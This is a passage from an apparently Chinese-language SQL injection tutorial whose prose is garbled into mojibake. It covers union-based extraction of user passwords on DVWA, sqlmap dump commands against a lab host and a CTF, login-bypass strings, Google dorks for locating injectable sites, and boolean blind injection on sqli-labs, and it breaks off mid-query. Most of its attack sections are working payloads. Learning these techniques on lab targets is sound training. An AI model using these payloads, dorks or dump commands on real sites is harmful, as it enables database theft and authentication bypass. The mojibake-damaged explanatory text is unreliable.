æ•°å­—å‹ä¸éœ€è¦å•å¼•å·æ¥é—­åˆï¼Œè€Œå­—ç¬¦ä¸²ä¸€èˆ¬éœ€è¦é€šè¿‡å•å¼•å·æ¥é—­åˆçš„\n\næ•°å­—å‹ï¼šselect * from table where id =$id\n\nå­—ç¬¦å‹ï¼šselect * from table where id='$id'\n\nåˆ¤æ–­æ•°å­—å‹\n\n```sql\n1 and 1=1 #æ°¸çœŸå¼   select * from table where id=1 and 1=1\n1 and 1=2 #æ°¸å‡å¼   select * from table where id=1 and 1=2\n#ifé¡µé¢è¿è¡Œé”™è¯¯ï¼Œåˆ™è¯´æ˜æ­¤Sqlæ³¨å…¥ä¸ºæ•°å­—å‹æ³¨å…¥ã€‚\n```\n\nåˆ¤æ–­å­—ç¬¦å‹\n\n```sql\n1' and '1'='1  \n\n1' and '1'='2 \n#ifé¡µé¢è¿è¡Œé”™è¯¯ï¼Œåˆ™è¯´æ˜æ­¤ Sql æ³¨å…¥ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚\n```\n\næ‰§è¡Œä¸Šé¢ä¸¤ç§æ–¹å¼ä¸€ç§å°±å¯å¾—å‡ºç»“è®ºï¼Œæ˜¾ç¤ºè¿™ä¸ªæ˜¯å­—ç¬¦å‹æ³¨å…¥\n\n#### 2.çŒœè§£SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°\n\n```sql\n1' or 1=1 order by 1 #    æŸ¥è¯¢æˆåŠŸ  ã€order by x å¯¹ç¬¬å‡ åˆ—è¿›è¡Œæ’åºã€‘1'  order by 1 #  id=â€˜1â€˜  #â€™ æ³¨é‡Š\n1' or 1=1 order by 2 #    æŸ¥è¯¢æˆåŠŸ\n1' or 1=1 order by 3 #    æŸ¥è¯¢å¤±è´¥\n```\n\n![](https://img.jwt1399.top//img/20200726161444.png)è¯´æ˜æ‰§è¡Œçš„SQLæŸ¥è¯¢è¯­å¥ä¸­åªæœ‰ä¸¤ä¸ªå­—æ®µï¼Œå³è¿™é‡Œçš„First nameã€Surnameã€‚\n\n#### 3.ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº\n\n```sql\n1' union select 1,2 #    \n```\n\n![](https://i.loli.net/2019/07/07/5d2157a15b62731652.png)\nè¯´æ˜æ‰§è¡Œçš„SQLè¯­å¥ä¸ºselect First name,Surname from xx where ID='id'\n\n**ç†è§£select 1,2**ï¼šä¾‹å¦‚ä¸€ä¸ªç½‘ç«™çš„å‚æ•°ä¼ é€’æ‰§è¡Œçš„æŸ¥è¯¢æœ‰3ä¸ªå­—æ®µï¼Œå¾ˆå¯èƒ½è¿™äº›å­—æ®µä¸æ˜¯éƒ½æ˜¾ç¤ºåœ¨ç½‘é¡µå‰ç«¯çš„ï¼Œå‡å¦‚å…¶ä¸­çš„1æˆ–2ä¸ªå­—æ®µçš„æŸ¥è¯¢ç»“æœæ˜¯ä¼šè¿”å›åˆ°å‰ç«¯çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦çŸ¥é“è¿™3ä¸ªå­—æ®µä¸­å“ªä¸¤ä¸ªç»“æœä¼šå›æ˜¾ï¼Œè¿™ä¸ªè¿‡ç¨‹ç›¸å½“äºæ‰¾åˆ°æ•°æ®åº“ä¸å‰ç«¯æ˜¾ç¤ºçš„é€šé“ã€‚å¦‚æœæˆ‘ä»¬ç›´æ¥è¾“å…¥æŸ¥è¯¢å­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼Œè¯­å¥ä¼šéå¸¸å†—é•¿ï¼Œè€Œä¸”å¾ˆå¯èƒ½è¿˜éœ€è¦åšå¾ˆå¤šæ¬¡æµ‹è¯•ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªç®€å•çš„select 1,2,3ï¼Œæ ¹æ®æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„æ•°å­—å°±å¯ä»¥çŸ¥é“å“ªä¸ªæ•°å­—æ˜¯è¿™ä¸ªâ€œé€šé“â€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æŠŠè¿™ä¸ªæ•°å­—æ”¹æˆæˆ‘ä»¬æƒ³æŸ¥è¯¢çš„å†…å®¹ï¼ˆå¦‚id,passwordï¼‰ï¼Œå½“æ•°æ®çˆ†ç ´æˆåŠŸåï¼Œå°±ä¼šåœ¨çª—å£æ˜¾ç¤ºæˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚[SELECT 1,2,3...çš„å«ä¹‰åŠå…¶åœ¨SQLæ³¨å…¥ä¸­çš„ç”¨æ³•](https://blog.csdn.net/weixin_44840696/article/details/89166154)\n\n#### 4.è·å–å½“å‰æ•°æ®åº“\n\nä¸Šæ­¥çŸ¥é“å­—æ®µæ˜¾ç¤ºé¡ºåºï¼Œé‚£æˆ‘ä»¬åœ¨å­—æ®µ2çš„ä½ç½®ä¸Šæ˜¾ç¤ºæ•°æ®åº“è¯•è¯•\n\n```sql\n1' union select 1,database() #\n```\n![](https://i.loli.net/2019/07/07/5d215880225ab67916.png)\nè¯´æ˜å½“å‰çš„æ•°æ®åº“ä¸ºdvwaã€‚\n\n#### 5.è·å–æ•°æ®åº“ä¸­çš„è¡¨\n\n```sql\n1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n\n1' union select 1,table_name from information_schema.tables where table_schema='dvwa' #\n\n```\n\n**information_schema.tables**å­˜å‚¨äº†æ•°æ®è¡¨çš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œä¸‹é¢å¯¹å¸¸ç”¨çš„å­—æ®µè¿›è¡Œä»‹ç»ï¼š\n\n- table_schema: è®°å½•**æ•°æ®åº“å**ï¼›\n- table_name: è®°å½•**æ•°æ®è¡¨å**ï¼›\n- engine : å­˜å‚¨**å¼•æ“**ï¼›\n- table_rows: å…³äºè¡¨çš„ç²—ç•¥è¡Œä¼°è®¡ï¼›\n- data_length : è®°å½•**è¡¨çš„å¤§å°**ï¼ˆå•ä½å­—èŠ‚ï¼‰ï¼›\n- index_length : è®°å½•è¡¨çš„**ç´¢å¼•çš„å¤§å°**ï¼›\n- row_format: å¯ä»¥æŸ¥çœ‹æ•°æ®è¡¨**æ˜¯å¦å‹ç¼©**è¿‡ï¼›\n\n![](https://img.jwt1399.top//img/20200726161522.png)\n\nè¯´æ˜æ•°æ®åº“dvwaä¸­ä¸€å…±æœ‰ä¸¤ä¸ªè¡¨ï¼Œguestbookä¸usersã€‚\n\n#### 6.è·å–è¡¨ä¸­çš„å­—æ®µå\n\n```sql\n1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #\n```\n\n![](https://img.jwt1399.top//img/20200726161553.png)\n\nè¯´æ˜usersè¡¨ä¸­æœ‰8ä¸ªå­—æ®µï¼Œåˆ†åˆ«æ˜¯user_id,first_name,last_name,user,password,avatar,last_login,failed_login\n\n#### 7.è·å–å­—æ®µä¿¡æ¯\n\n```sql\n1' union select group_concat(user_id,first_name),group_concat(password) from users #\n\n1' union select group_concat(concat_ws(':',first_name,password)),2 from users #\n\n1' union select first_name,password from users #\n```\n\n![](https://i.loli.net/2019/07/07/5d21587feccc627920.png)\n\nè¿™æ ·å°±å¾—åˆ°äº†usersè¡¨ä¸­æ‰€æœ‰ç”¨æˆ·çš„user_id,first_name,last_name,passwordçš„æ•°æ®ã€‚\n\n### 3 å®æˆ˜æ¼”ç»ƒä¸€å“ˆ\n\nå°±ä»¥æˆ‘è‡ªå·±æ­å»ºçš„[é¶æœº](http://139.224.112.182:8801/)ä¸ºä¾‹å­ğŸŒ°\n\nåœ¨ä¸»é¡µæœç´¢æ¡†å‘ç°æ³¨å…¥ç‚¹ï¼Œè¯ä¸å¤šè¯´å¼€å§‹æ³¨å…¥\n\n```sql\n#åˆ¤æ–­æ³¨å…¥ç±»å‹ #ã€æ•°å­—å‹ã€‘\n1 and 1=1 \n1 and 1=2 \n\n#æŸ¥è¯¢æ•°æ®åº“ #ã€testã€‘\n-1 union select 1,2,database()\n\n#è·å–æ•°æ®åº“ä¸­çš„è¡¨ #ã€adminã€newsã€‘\n-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='test' \n\n#è·å–è¡¨ä¸­çš„å­—æ®µå #ã€ user_idã€user_nameã€user_passã€‘\n-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='admin'\n\n#è·å–å­—æ®µä¿¡æ¯ ã€admin:mysqlã€‘\n-1 union select 1,group_concat(user_name),group_concat(user_pass) from admin\n-1 union select 1,user_name,user_pass from admin \n```\næˆ‘ä»¬åˆå¿«é€Ÿçš„å®ç°äº†ä¸€æ¬¡æ‰‹å·¥æ³¨å…¥ï¼Œä½†æ˜¯ä½ æœ‰æ²¡å’Œæˆ‘ä¸€æ ·çš„æ„Ÿè§‰ï¼Œå¤ªéº»çƒ¦äº†ï¼Œæœ‰æ›´æ–¹ä¾¿çš„æ–¹æ³•å—ï¼Œemm...\n\nå½“ç„¶æœ‰å•¦ï¼Œä½¿ç”¨SqlMapå·¥å…·å¯ä»¥å¿«é€Ÿå®ç°æ³¨å…¥ğŸ‘‡\n\n## å››ã€ä½¿ç”¨SqlMapæ³¨å…¥\n\nå…·ä½“ä½¿ç”¨æ–¹æ³•è¯·é—®æˆ‘ä¹‹å‰å†™çš„æ–‡ç« ğŸ‘‰[sqlmapä½¿ç”¨æ–¹æ³•](https://www.jianshu.com/p/a46abd1e67aa)\n\n#### SqlMapåˆä½“éªŒ\n\næ¥ç€ä½¿ç”¨ä¸Šé¢é¶æœºè¿›è¡Œæµ‹è¯•\n\n```bash\n#æŸ¥è¯¢æ•°æ®åº“ #ã€testã€‘\npython sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 --dbs\n\n#è·å–æ•°æ®åº“ä¸­çš„è¡¨ #ã€adminã€newsã€‘\npython sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test --tables\n\n#è·å–è¡¨ä¸­çš„å­—æ®µå #ã€ user_idã€user_nameã€user_passã€‘\npython sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test -T admin --columns\n\n#è·å–å­—æ®µä¿¡æ¯ ã€admin:mysqlã€‘\npython sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test -T admin -C user_name,user_pass --dump\n```\n\n#### ä¸€é“CTFé¢˜ç›®\n\né¢˜ç›®ï¼šç®€å•çš„sqlæ³¨å…¥2\n\nåœ°å€ï¼šhttp://139.224.112.182:8087/ctf_collect\n\nè§£æï¼šhttps://www.jianshu.com/p/1aeedef99f21\n\n**1**.æŸ¥è¯¢å½“å‰æ•°æ®åº“(ç©ºæ ¼è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨tamperè„šæœ¬ä¸­space2comment)\n\n```bash\npython sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --dbs \n```\n\n![](https://i.loli.net/2020/05/04/duk1Pzgn8vseYVw.png)\nå‘ç°web1æ•°æ®åº“\n**2**.æŸ¥è¯¢æ•°æ®åº“ä¸­çš„è¡¨\n\n```bash\npython sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment -D web1 --tables\n```\n\n![](https://i.loli.net/2020/05/04/VqgauHCbZ7SIFYL.png)\nå‘ç°flagè¡¨\n**3**.æŸ¥è¯¢flagè¡¨ä¸­å­—æ®µå\n\n````bash\npython sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --columns -T flag -D web1\n````\n\n![](https://i.loli.net/2020/05/04/DvPQ6OponqHuCZz.png)\nå‘ç°flagå­—æ®µ\n**4**.æŸ¥è¯¢å­—æ®µflagä¿¡æ¯\n\n```bash\npython sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --dump -C flag -T flag -D web1\n```\n<img src=\"https://i.loli.net/2020/05/04/TfZAoObdMPiLJIt.png\" style=\"zoom: 80%;\" />\n\n## äº”ã€å‘ç°æ³¨å…¥ç‚¹\n\n### 1 ä½¿ç”¨æ¼æ´æ‰«æå·¥å…·\n\nå·¥å…·ï¼šOWASP ZAPã€Dç›¾ã€Seay\n\nä¸‡èƒ½å¯†ç ï¼š\n\n```sql\n1' or 1=1 # ç”¨æˆ·åå’Œå¯†ç éƒ½å¯  \n' or '1'='1' -- \n\n1' or '1'='1 å¯†ç æ‰å¯\n```\n\n### 2 é€šè¿‡Google Hacking å¯»æ‰¾SQLæ³¨å…¥\n\n> çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å·²ç»å®Œæˆäº†ä¸€æ¬¡æœ€åŸºç¡€çš„GETå­—ç¬¦å‹Sqlæ³¨å…¥ï¼Œæœ‰äººå¯èƒ½ä¼šé—®äº†ï¼Œè¿™æ˜¯è‡ªå·±æ­å»ºçš„é¶æœºï¼ŒçŸ¥é“æ˜¯å­˜åœ¨sqlæ³¨å…¥ï¼ŒçœŸå®ç¯å¢ƒä¸­å¦‚ä½•å»å‘ç°Sqlæ³¨å…¥å‘¢\n\n```\ninurl:php?id=\ninurl:.asp?id=\ninurl:index.php?id=\ninurl:showproduct.asp?id=\nsite:http://139.224.112.182:8802/ inurl:php?id\nsite:https://jwt1399.top inurl:.html\n......\n```\n\næœåŠ¡å™¨æŠ¥é”™ï¼Œå¹¶æŠŠé”™è¯¯ä¿¡æ¯è¿”å›åˆ°ç½‘é¡µä¸Šé¢ã€‚æ ¹æ®é”™è¯¯ä¿¡æ¯ï¼Œåˆ¤æ–­è¿™é‡Œå¤§æ¦‚ç‡å­˜åœ¨æ³¨å…¥ç‚¹ã€‚\n\n## å…­ã€ ä¿®å¤å»ºè®®\n\n1. è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåº”å½“è®¤ä¸ºç”¨æˆ·çš„æ‰€æœ‰è¾“å…¥éƒ½æ˜¯ä¸å®‰å…¨çš„ã€‚\n2. å¯¹äºæ•´æ•°ï¼Œåˆ¤æ–­å˜é‡æ˜¯å¦ç¬¦åˆ[0-9]çš„å€¼ï¼›å…¶ä»–é™å®šå€¼ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œåˆæ³•æ€§æ ¡éªŒï¼›\n3. å¯¹äºå­—ç¬¦ä¸²ï¼Œå¯¹SQLè¯­å¥ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰(å•å¼•å·è½¬æˆä¸¤ä¸ªå•å¼•å·ï¼ŒåŒå¼•å·è½¬æˆä¸¤ä¸ªåŒå¼•å·)ã€‚\n4. ç»‘å®šå˜é‡ï¼Œä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥\n\n# è¿›é˜¶ç¯‡\n\n## ä¸€ã€SQLæ³¨å…¥åŸºç¡€çŸ¥è¯†\n\n> ä¸è¦æ€¥äºè¿›è¡ŒSQLæ³¨å…¥ï¼Œè¯·å…ˆçœ‹å®Œè¿™éƒ¨åˆ†ï¼Œå¾ˆé‡è¦ï¼ï¼Œå¾ˆé‡è¦ï¼ï¼Œå¾ˆé‡è¦ï¼\n\n**1.åŸºæœ¬çš„SQLè¯­å¥æŸ¥è¯¢æºç **\n\n```sql\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n# LIMIT [åç§»é‡],è¡Œæ•°\n```\n\né€šå¸¸æƒ…å†µä¸‹è”åˆæŸ¥è¯¢(union)æ—¶éœ€è¦å°†å‰é¢çš„æŸ¥è¯¢ç»“æœé™å®šä¸ºç©ºé›†ï¼Œåé¢çš„æŸ¥è¯¢ç»“æœæ‰èƒ½æ˜¾ç¤ºå‡ºæ¥ã€‚ä¾‹å¦‚idå€¼è®¾ä¸ºè´Ÿæ•°æˆ–0ï¼Œå› ä¸ºå¸¦æœ‰`LIMIT 0,1`åˆ™åªèƒ½æ˜¾ç¤ºä¸€æ¡æ•°æ®\n\n```sql\n?id=-1 union select 1,2,3\n?id=0  union select 1,2,3\n?id=-1' union select 1,2,group_concat(username,password) from users\n```\n\n**2.MySQLæ•°æ®åº“å‡ ç§æ³¨é‡Š**\n\n|                æ³¨é‡Šç¬¦                 | æè¿°                                                         |\n| :-----------------------------------: | ------------------------------------------------------------ |\n| ` #                                 ` | å•è¡Œæ³¨é‡Š  URLç¼–ç  `%23`ï¼Œåœ¨URLæ¡†ç›´æ¥ä½¿ç”¨ä¸­`#`å·å¿…é¡»ç”¨`%23`æ¥è¡¨ç¤ºï¼Œ#åœ¨URLæ¡†ä¸­æœ‰ç‰¹å®šå«ä¹‰ï¼Œä»£è¡¨é”šç‚¹ |\n|          `--ç©ºæ ¼           `          | å•è¡Œæ³¨é‡Š ï¼Œå®é™…ä½¿ç”¨ä¸­`--ç©ºæ ¼`ç”¨`--+`æ¥è¡¨ç¤ºã€‚å› ä¸ºåœ¨URLæ¡†ä¸­ï¼Œæµè§ˆå™¨åœ¨å‘é€è¯·æ±‚çš„æ—¶å€™ä¼šæŠŠURLæœ«å°¾çš„ç©ºæ ¼èˆå»ï¼Œæ‰€ä»¥ç”¨`--+`ä»£æ›¿`--ç©ºæ ¼` |\n|                `/* */`                | å—æ³¨é‡Š                                                       |\n|               `/*! */`                | å†…è”æ³¨é‡Š                                                     |\n\n**3.æ•°æ®åº“ç›¸å…³--Information_schemaåº“**\n\n- `information_schema`ï¼Œç³»ç»Ÿæ•°æ®åº“ï¼ŒåŒ…å«æ‰€æœ‰æ•°æ®åº“ç›¸å…³ä¿¡æ¯ã€‚\n- `information_schema.schemata`ä¸­`schema_name`åˆ—ï¼Œå­—æ®µä¸ºæ‰€æœ‰æ•°æ®åº“åç§°ã€‚\n- `information_schema.tables`ä¸­`table_name`åˆ—å¯¹åº”æ•°æ®åº“æ‰€æœ‰è¡¨å\n- `information_schema.columns`ä¸­ï¼Œ`column_name`åˆ—å¯¹åº”æ‰€æœ‰åˆ—å\n\n#### **4.è¿æ¥å­—ç¬¦ä¸²å‡½æ•°**\n\n[concat(),concat_ws()ä¸åŠgroup_concat()çš„ç”¨æ³•](https://links.jianshu.com/go?to=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1595349117525189591%26wfr%3Dspider%26for%3Dpc)\n\n- `concat(str1,str2,â€¦)`â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²\n\n- `concat_ws(separator,str1,str2,â€¦)`â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²\n\n- `group_concat(str1,str2,â€¦)`â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ï¼ŒçŸ¥é“è¿™ä¸‰ä¸ªå‡½æ•°èƒ½ä¸€æ¬¡æ€§æŸ¥å‡ºæ‰€æœ‰ä¿¡æ¯å°±è¡Œäº†ã€‚\n\n**6.MySQLå¸¸ç”¨çš„ç³»ç»Ÿå‡½æ•°**\n\n```mysql\nversion()            #MySQLç‰ˆæœ¬\nuser()               #æ•°æ®åº“ç”¨æˆ·å\ndatabase()           #æ•°æ®åº“å\n@@basedir            #æ•°æ®åº“å®‰è£…è·¯å¾„\n@@datadir            #æ•°æ®åº“æ–‡ä»¶å­˜æ”¾è·¯å¾„\n@@version_compile_os #æ“ä½œç³»ç»Ÿç‰ˆæœ¬\n```\n**7.MySQLå‡½æ•°**\n\n```sql\ncount(*)ï¼šè¿”å›åŒ¹é…æŒ‡å®šæ¡ä»¶çš„è¡Œæ•°ã€‚\nrand()ï¼šè¿”å›0~1é—´çš„å°æ•°\nfloor()ï¼šæŠŠå°æ•°å‘ä¸‹å–æ•´\ngroup byè¯­å¥ï¼šæŠŠç»“æœåˆ†ç»„è¾“å‡º\n```\n\n**8.[sqlæ³¨å…¥ä¹‹ä½ é—®æˆ‘ç­”]( https://www.cnblogs.com/xishaonian/p/6036909.html)**\n\n## äºŒã€ç›²æ³¨\n\n> SQLç›²æ³¨ï¼Œä¸ä¸€èˆ¬æ³¨å…¥çš„åŒºåˆ«åœ¨äºï¼Œä¸€èˆ¬çš„æ³¨å…¥æ”»å‡»è€…å¯ä»¥ç›´æ¥ä»é¡µé¢ä¸Šçœ‹åˆ°æ³¨å…¥è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œè€Œç›²æ³¨æ—¶æ”»å‡»è€…é€šå¸¸æ˜¯æ— æ³•ä»æ˜¾ç¤ºé¡µé¢ä¸Šè·å–æ‰§è¡Œç»“æœï¼Œç”šè‡³è¿æ³¨å…¥è¯­å¥æ˜¯å¦æ‰§è¡Œéƒ½æ— ä»å¾—çŸ¥ï¼Œå› æ­¤ç›²æ³¨çš„éš¾åº¦è¦æ¯”ä¸€èˆ¬æ³¨å…¥é«˜ã€‚ç›®å‰ç½‘ç»œä¸Šç°å­˜çš„SQLæ³¨å…¥æ¼æ´å¤§å¤šæ˜¯SQLç›²æ³¨ã€‚\n\n### åŸºç¡€çŸ¥è¯†\n\n#### æ‰‹å·¥ç›²æ³¨æ€è·¯\n\næ‰‹å·¥ç›²æ³¨çš„è¿‡ç¨‹ï¼Œå°±åƒä½ ä¸ä¸€ä¸ªæœºå™¨äººèŠå¤©ï¼Œ\nè¿™ä¸ªæœºå™¨äººçŸ¥é“çš„å¾ˆå¤šï¼Œä½†åªä¼šå›ç­”â€œ`æ˜¯`â€æˆ–è€…â€œ`ä¸æ˜¯`â€ï¼Œ\nå› æ­¤ä½ éœ€è¦è¯¢é—®å®ƒè¿™æ ·çš„é—®é¢˜ï¼Œä¾‹å¦‚â€œ`æ•°æ®åº“åå­—çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯ä¸æ˜¯aå•Šï¼Ÿ`â€\né€šè¿‡è¿™ç§æœºæ¢°çš„è¯¢é—®ï¼Œæœ€ç»ˆè·å¾—ä½ æƒ³è¦çš„æ•°æ®ã€‚\n\n#### æ‰‹å·¥ç›²æ³¨çš„æ­¥éª¤\n\n1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ \n2.çŒœè§£å½“å‰æ•°æ®åº“å \n3.çŒœè§£æ•°æ®åº“ä¸­çš„è¡¨å\n4.çŒœè§£è¡¨ä¸­çš„å­—æ®µå \n5.çŒœè§£æ•°æ®\n\n#### ç›²æ³¨å¸¸ç”¨å‡½æ•°\n\n| å‡½æ•°                            | æè¿°                                                         |\n| ------------------------------- | ------------------------------------------------------------ |\n| left(å­—ç¬¦ä¸²ï¼Œæˆªå–é•¿åº¦)          | ä»å·¦è¾¹æˆªå–æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸²                                   |\n| length(å­—ç¬¦ä¸²)                  | è·å–å­—ç¬¦ä¸²çš„é•¿åº¦                                             |\n| ascii(å­—ç¬¦ä¸²)                   | å°†æŒ‡å®šå­—ç¬¦ä¸²è¿›è¡Œasciiç¼–ç                                     |\n| substr(å­—ç¬¦ä¸²ï¼Œstartï¼Œæˆªå–é•¿åº¦) | æˆªå–å­—ç¬¦ä¸²ï¼Œå¯ä»¥æŒ‡å®šèµ·å§‹ä½ç½®å’Œé•¿åº¦                           |\n| mid(å­—ç¬¦ä¸²ï¼Œstartï¼Œæˆªå–é•¿åº¦)    | æˆªå–å­—ç¬¦ä¸²ï¼Œå¯ä»¥æŒ‡å®šèµ·å§‹ä½ç½®å’Œé•¿åº¦                           |\n| count()                         | è®¡ç®—æ€»æ•°ï¼Œè¿”å›åŒ¹é…æ¡ä»¶çš„è¡Œæ•°ã€‚                               |\n| sleep(n)                        | å°†ç¨‹åºæŒ‚èµ·nç§’                                                |\n| if(å‚æ•°1ï¼Œå‚æ•°2ï¼Œå‚æ•°3)         | å‚æ•°1ä¸ºæ¡ä»¶ï¼Œå½“å‚æ•°1è¿”å›çš„ç»“æœä¸ºtrueæ—¶ï¼Œæ‰§è¡Œå‚æ•°2ï¼Œå¦åˆ™æ‰§è¡Œå‚æ•°3 |\n\n### å¸ƒå°”ç›²æ³¨\n\n#### **å¸ƒå°”æ³¨å…¥åˆ©ç”¨æƒ…æ™¯**\n\n- é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½ï¼Œå¹¶ä¸”æ²¡æœ‰è¾“å‡ºSQLè¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯\n- åªèƒ½é€šè¿‡é¡µé¢è¿”å›æ­£å¸¸ä¸ä¸æ­£å¸¸åˆ¤æ–­\n\n#### æ‰‹å·¥å®ç°å¸ƒå°”ç›²æ³¨\n\né¶æœºï¼šsqli-labsç¬¬5å…³\n\n##### 1 .æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»åˆ«\n\n```sql\n?id=1 and 1=1\n?id=1 and 1=2\nã€å­—ç¬¦å‹ã€‘\n```\n\n##### 2.çŒœè§£æ•°æ®åº“é•¿åº¦\n\nä½¿ç”¨length()åˆ¤æ–­æ•°æ®åº“é•¿åº¦ï¼ŒäºŒåˆ†æ³•å¯æé«˜æ•ˆç‡\n\n```sql\n?id=1' and length(database())>5 --+\n?id=1' and length(database())<10 --+\n?id=1' and length(database())=8 --+\nã€length=8ã€‘\n```\n\n##### 3.çŒœå½“å‰æ•°æ®åº“å\n\n###### æ–¹æ³•1ï¼šä½¿ç”¨`substrå‡½æ•°`\n\n```sql\n?id=1' and substr(database(),1,1)>'r'--+\n?id=1' and substr(database(),1,1)<'t'--+\n?id=1' and substr(database(),1,1)='s'--+\n?id=1' and substr(database(),2,1)='e'--+\n...\n?id=1' and substr(database(),8,1)='y'--+\nã€securityã€‘\n```\n\n###### æ–¹æ³•2ï¼šä½¿ç”¨`asciiå‡½æ•°å’Œsubstrå‡½æ•°`\n\n```sql\n?id=1' and ascii(substr(database(),1,1))>114 --+\n?id=1' and ascii(substr(database(),1,1))<116 --+\n?id=1' and ascii(substr(database(),1,1))=115 --+\nã€securityã€‘\n```\n\n![ASCillè¡¨](https://i.loli.net/2020/05/15/Pqd31eKrgQbzCfL.png)\n\n###### æ–¹æ³•3ï¼šä½¿ç”¨`leftå‡½æ•°`\n\n```sql\n?id=1' and left(database(),1)>'r'--+\n?id=1' and left(database(),1)<'t'--+\n?id=1' and left(database(),1)='s' --+\n?id=1' and left(database(),2)='se' --+\n?id=1' and left(database(),3)='sec' --+\n...\n?id=1' and left(database(),8)='security' --+\nã€securityã€‘\n```\n\n###### æ–¹æ³•4ï¼šä½¿ç”¨`Burpsuiteçš„Intruderæ¨¡å—`\n\nå°†è·å–æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦çš„è¯·æ±‚åŒ…æ‹¦æˆªå¹¶å‘é€åˆ°Intruderæ¨¡å—\n\nè®¾ç½®æ”»å‡»å˜é‡ä»¥åŠæ”»å‡»ç±»å‹\n\n![](https://i.loli.net/2020/05/15/k9ZnQNwtxCaPFEK.png)\n\nè®¾ç½®ç¬¬ä¸€ä¸ªæ”»å‡»å˜é‡ï¼Œè¿™ä¸ªå˜é‡æ˜¯æ§åˆ¶ç¬¬å‡ ä¸ªå­—ç¬¦çš„\n\n![](https://i.loli.net/2020/05/15/Q9VEkKqtIJOcPdh.png)\n\nè®¾ç½®ç¬¬äºŒä¸ªæ”»å‡»å˜é‡ï¼Œè¿™ä¸ªå˜é‡æ˜¯æ•°æ®åº“åå­—ç¬¦\n\n![](https://i.loli.net/2020/05/15/Ruzc9a1JPyVfKq3.png)\n\nå¼€å§‹æ”»å‡»ï¼Œä¸€å°ä¼šå°±èƒ½å¾—åˆ°æµ‹è¯•ç»“æœï¼Œé€šè¿‡å¯¹é•¿åº¦å’Œå˜é‡è¿›è¡Œæ’åºå¯ä»¥çœ‹åˆ°æ•°æ®åº“åæˆåŠŸå¾—åˆ°\n\n![](https://i.loli.net/2020/05/15/zixp5ct3E82unDX.png)\n\n\n\n##### 4.åˆ¤æ–­è¡¨çš„ä¸ªæ•°\n\ncount()å‡½æ•°æ˜¯ç”¨æ¥ç»Ÿè®¡è¡¨ä¸­è®°å½•çš„ä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›åŒ¹é…æ¡ä»¶çš„è¡Œæ•°ã€‚\n\n```sql\n?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>0 --+\n?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+\nã€4ä¸ªè¡¨ã€‘\n```\n\n##### 5.åˆ¤æ–­è¡¨çš„é•¿åº¦\n\nlimitå¯ä»¥è¢«ç”¨äºå¼ºåˆ¶selectè¯­å¥è¿”å›æŒ‡å®šçš„æ¡æ•°ã€‚\n\n```sql\n?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+\nã€ç¬¬ä¸€ä¸ªè¡¨é•¿åº¦ä¸º6ã€‘\n\n?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8 --+\nã€ç¬¬äºŒä¸ªè¡¨é•¿åº¦ä¸º8ã€‘\n```\n\n##### 6.çŒœè§£è¡¨å\n\n###### æ–¹æ³•1ï¼šä½¿ç”¨`substrå‡½æ•°`\n\n```sql\n?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>'d' --+\n?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>'f' --+\n?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' --+\n...\n?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)='s' 